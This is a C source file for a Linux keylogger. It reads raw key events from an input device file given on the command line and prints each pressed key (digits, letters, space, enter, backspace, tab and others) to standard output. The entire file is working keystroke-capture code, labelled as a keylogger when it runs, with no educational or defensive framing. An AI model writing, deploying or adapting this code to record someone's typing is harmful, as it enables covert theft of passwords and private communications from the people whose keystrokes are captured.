#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <linux/input.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        printf("Usage: %s <event-file>\n", argv[0]);
        exit(-1);
    }
    
    printf("Keylogger activating.....\n");
    int fd = open(argv[1], O_RDONLY, 0);
    
    if (fd == -1)
    {
        perror("Error opening device");
        exit(-1);
    }
    
    printf("Opened file descriptor: %d\n", fd);
    
    struct input_event ie;
    
    while(read(fd, &ie, sizeof(ie)) > 0)
    {
        // Only process key press events
        if (ie.type == EV_KEY && ie.value == 1)
        {
            // Numbers 1-9
            if (ie.code >= 2 && ie.code <= 10)
            {
                printf("%d", ie.code - 1);
                fflush(stdout);
            }
            // Number 0
            else if (ie.code == 11)
            {
                printf("0");
                fflush(stdout);
            }
            // Letters Q-P
            else if (ie.code >= 16 && ie.code <= 25)
            {
                printf("%c", "qwertyuiop"[ie.code - 16]);
                fflush(stdout);
            }
            // Letters A-L
            else if (ie.code >= 30 && ie.code <= 38)
            {
                printf("%c", "asdfghjkl"[ie.code - 30]);
                fflush(stdout);
            }
            // Letters Z-M
            else if (ie.code >= 44 && ie.code <= 50)
            {
                printf("%c", "zxcvbnm"[ie.code - 44]);
                fflush(stdout);
            }
            // Space
            else if (ie.code == KEY_SPACE)
            {
                printf(" ");
                fflush(stdout);
            }
            // Enter
            else if (ie.code == KEY_ENTER)
            {
                printf("\n");
            }
            // Backspace
            else if (ie.code == KEY_BACKSPACE)
            {
                printf("[BACKSPACE]");
                fflush(stdout);
            }
            // Tab
            else if (ie.code == KEY_TAB)
            {
                printf("[TAB]");
                fflush(stdout);
            }
            // Any other key
            else
            {
                printf("[KEY:%d]", ie.code);
                fflush(stdout);
            }
        }
    }
    
    close(fd);
    return 0;
}
